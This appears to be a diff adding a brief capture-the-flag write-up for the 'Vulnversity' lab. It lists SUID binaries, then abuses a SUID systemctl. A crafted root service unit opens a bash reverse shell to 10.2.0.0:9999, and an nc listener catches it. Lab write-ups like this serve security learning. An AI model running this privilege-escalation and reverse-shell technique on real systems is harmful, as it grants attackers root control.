@@ -1,0 +1,48 @@
+
+#Vulnversity
+
+Used this to list SUID
+find / -user root -perm -4000 -exec ls -ldb {} \;
+
+We get the following info.
+
+-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
+-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
+-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
+-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
+-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
+-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
+
+
+We can leverage /bin/systemctl by creating a service that will create a reverse shell with root privileges, we go to a folder where we can write and do:
+	
+
+	/var/www/html$ vi root.service
+
+		[Unit]
+		Description=roooooooooot
+
+		[Service]
+		Type=simple
+		User=root
+		ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.2.0.0/9999 0>&1'
+
+		[Install]
+		WantedBy=multi-user.target
+
+We set up a listening port on our local machine:
+
+	nc -lvpn 9999
+
+Then we run the following commands
+
+	/bin/systemctl enable /var/www/html/root.service 
+	/bin/systemctl start root
+
+We get a connection on port 9999 with root privileges.
+
+That was a nice way to privesc leveraging misconfigurations. 
+
+Source: https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49
